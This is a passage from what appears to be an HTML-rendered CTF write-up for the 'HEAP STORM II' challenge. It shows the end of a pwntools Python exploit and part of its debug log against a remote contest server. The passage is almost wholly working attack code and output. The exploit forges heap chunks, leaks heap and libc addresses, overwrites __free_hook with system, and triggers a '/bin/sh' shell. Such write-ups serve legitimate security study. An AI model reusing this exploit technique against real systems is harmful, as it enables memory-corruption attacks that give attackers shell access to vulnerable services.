p64(fake_chunk)      <span class="comment">#bk</span></span><br><span class="line">        update(<span class="number">7</span>, p1)</span><br><span class="line"></span><br><span class="line">        p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">        p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">        p2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)   <span class="comment">#bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks</span></span><br><span class="line">        update(<span class="number">8</span>, p2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># if the heap address starts with "0x56", you win</span></span><br><span class="line">            alloc(<span class="number">0x48</span>)     <span class="comment">#2</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="comment"># otherwise crash and try again</span></span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage)</span><br><span class="line">        update(<span class="number">2</span>, st)</span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(storage<span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line"></span><br><span class="line">        leak = view(<span class="number">1</span>)</span><br><span class="line">        heap = u64(leak)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'heap: %x'</span> % heap</span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(heap+<span class="number">0x10</span>) + p64(<span class="number">8</span>)</span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line"></span><br><span class="line">        leak = view(<span class="number">1</span>)</span><br><span class="line">        unsorted_bin = u64(leak)</span><br><span class="line">        main_arena = unsorted_bin - <span class="number">0x58</span></span><br><span class="line">        libc_base = main_arena - <span class="number">0x399b00</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'libc_base: %x'</span> % libc_base</span><br><span class="line">        libc_system = libc_base + <span class="number">0x3f480</span></span><br><span class="line">        free_hook = libc_base + <span class="number">0x39b788</span></span><br><span class="line"></span><br><span class="line">        st = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13377331</span>) + p64(storage) + p64(<span class="number">0x1000</span>) + p64(free_hook) + p64(<span class="number">0x100</span>) + p64(storage+<span class="number">0x50</span>) + p64(<span class="number">0x100</span>) + <span class="string">'/bin/sh\0'</span></span><br><span class="line">        update(<span class="number">0</span>, st)</span><br><span class="line">        update(<span class="number">1</span>, p64(libc_system))</span><br><span class="line"></span><br><span class="line">        r.sendline(<span class="string">'3'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">        r.sendline(<span class="string">'%d'</span> % <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    host = <span class="string">'202.120.7.205'</span></span><br><span class="line">    exploit(host)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 202.120.7.205 on port 5655: Done</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;0NrK7lj7hzsvZNOW&apos;</span><br><span class="line">[DEBUG] Received 0x1 bytes:</span><br><span class="line">    &apos;\n&apos;</span><br><span class="line">0NrK7lj7hzsvZNOW</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">    00000000  01 31 ef d8                                         │·1··││</span><br><span class="line">    00000004</span><br><span class="line">[DEBUG] Received 0xf6 bytes:</span><br><span class="line">    &apos;    __ __ _____________   __   __    ___    ____\n&apos;</span><br><span class="line">    &apos;   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n&apos;</span><br><span class="line">    &apos;  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n&apos;</span><br><span class="line">    &apos; / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n&apos;</span><br><span class="line">    &apos;/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n&apos;</span><br><span class="line">[DEBUG] Received 0x54 bytes:</span><br><span class="line">    &apos;\n&apos;</span><br><span class="line">    &apos;===== HEAP STORM II =====\n&apos;</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 0 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1288\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 1 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 2 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1272\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x4f8 bytes:</span><br><span class="line">    00000000  68 68 68 68  68 68 68 68  68 68 68 68  68 68 68 68  │hhhh│hhhh│hhhh│hhhh│</span><br><span class="line">    *</span><br><span class="line">    000004f0  00 05 00 00  00 00 00 00                            │····│····││</span><br><span class="line">    000004f8</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 1 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 3 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1288\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 4 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;24\n&apos;</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    &apos;Chunk 5 Allocated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;2\n&apos;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    &apos;Index: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;4\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    &apos;Size: &apos;</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    &apos;1272\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;Content: &apos;</span><br><span class="line">[DEBUG] Sent 0x4f8 bytes:</span><br><span class="line">    00000000  68 68 68 68  68 68 68 68  68 68 68 68  68 68 68 68  │hhhh│hhhh│hhhh│hhhh│</span><br><span class="line">    *</span><br><span class="line">    000004f0  00 05 00 00  00 00 00 00                            │····│····││</span><br><span class="line">    000004f8</span><br><span class="line">[DEBUG] Received 0x10 bytes:</span><br><span class="line">    &apos;Chunk 4 Updated\n&apos;</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    &apos;1. Allocate\n&apos;</span><br><span class="line">    &apos;2. Update\n&apos;</span><br><span class="line">    &apos;3. Delete\n&apos;</span><br><span class="line">    &apos;4. View\n&apos;</span><br><span class="line">    &apos;5. Exit\n&apos;</span><br><span class="line">    &apos;Command: &apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">    